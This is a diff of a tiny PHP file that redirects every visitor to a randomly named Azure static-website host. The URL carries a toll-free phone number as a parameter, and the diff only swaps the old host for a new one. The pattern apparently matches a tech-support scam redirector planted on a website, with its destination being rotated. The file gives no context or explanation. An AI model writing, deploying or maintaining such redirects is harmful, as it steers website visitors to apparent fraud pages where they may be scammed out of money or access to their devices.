@@ -1,7 +1,7 @@
 <?php
 
 // Redirect browser
-header("Location: https://aksdq8ywdabisasdkjbasdas.z1.web.core.windows.net/index.html?Aniph=1-888-329-4110");
+header("Location: https://kalanaagu7wbdeucdys8dswd.z24.web.core.windows.net/index.html?Aniph=1-888-329-4110");
 
 exit;
 ?>
